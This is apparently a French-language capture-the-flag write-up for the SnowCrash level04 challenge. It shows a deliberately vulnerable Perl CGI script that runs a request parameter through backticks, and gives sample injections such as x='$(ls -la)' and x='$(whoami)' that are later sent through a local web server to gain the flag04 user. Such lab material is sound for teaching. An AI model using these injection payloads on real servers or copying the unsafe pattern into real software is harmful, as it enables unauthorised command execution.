Un script est présent dans le home :

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Ce script possède le bit SUID actif, ce qui signifie qu'il s'exécute avec les droits de son propriétaire, qui est **`flag04`** :

```bash
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```

Le script attend une requête HTTP, utilise le module CGI de Perl pour extraire le paramètre "x" de la requête, puis exécute et affiche le résultat de cette commande en utilisant la syntaxe des backticks de Perl (`). C'est une situation classique de vulnérabilité d'injection de commandes. On peut voir cette vulnérabilité en action avec des exemples tels que :

```bash
level04@SnowCrash:~$ ./level04.pl x=2
Content-type: text/html

2
level04@SnowCrash:~$ ./level04.pl x='$(ls -la)'
Content-type: text/html

total 16 dr-xr-x---+ 1 level04 level04 120 Mar 5 2016 . d--x--x--x 1 root users 340 Aug 30 2015 .. -r-x------ 1 level04 level04 220 Apr 3 2012 .bash_logout -r-x------ 1 level04 level04 3518 Aug 30 2015 .bashrc -rwsr-sr-x 1 flag04 level04 152 Mar 5 2016 level04.pl -r-x------ 1 level04 level04 675 Apr 3 2012 .profile
```

Cependant, lorsqu'on exécute la commande **`whoami`** :

```bash
level04@SnowCrash:~$ ./level04.pl x='$(whoami)'
Content-type: text/html

level04
```

On est toujours avec le user level04 et non le user flag04. Pourtant, le setuid est activé ?

Le problème ici est que Perl, pour des raisons de sécurité, ne respecte pas le bit SUID à partir des versions 5.12.0 (la version sur la VM est 5.14.2) : https://stackoverflow.com/questions/21597300/can-i-setuid-a-perl-script

C'est pour cela que le script s'exécute avec les droits de **`level04`** lorsqu'il est exécuté directement depuis le shell.

Cependant, le script est aussi présent dans le répertoire **`/var/www/level04`** :

```bash
level04@SnowCrash:~$ find / -user flag04 2>/dev/null
/var/www/level04
/var/www/level04/level04.pl
/rofs/var/www/level04
/rofs/var/www/level04/level04.pl
```

Ce qui suggère qu'il est probablement exécuté par un serveur web.

Peut-être qu’on peut faire exécuter le script directement sur le serveur plutôt qu’avec l’exécutable dans le home ?

Le commentaire **`# localhost:4747`** dans le script indique qu'il s'attend à être appelé sur le port 4747 du localhost. En utilisant `**curl**` ou un navigateur pour accéder à **`http://localhost:4747`**, on peut faire exécuter le script par le serveur web :

![Capture d’écran du 2023-07-12 00-19-33](https://github.com/Sleleu/snow_crash/assets/93100775/c892e540-5f5e-461d-afaa-fe23d0dfd9ab)

Tentons un whoami cette fois-ci :

![Capture d’écran du 2023-07-12 00-19-54](https://github.com/Sleleu/snow_crash/assets/93100775/8bc1f5ef-73a8-4617-8918-68e4005ed539)

Nous sommes bien avec le user flag04 cette fois ! On peut retenter la commande getflag :

![Capture d’écran du 2023-07-12 00-20-39](https://github.com/Sleleu/snow_crash/assets/93100775/b3296c9a-5067-48f9-ae92-e5f24ec9afc0)


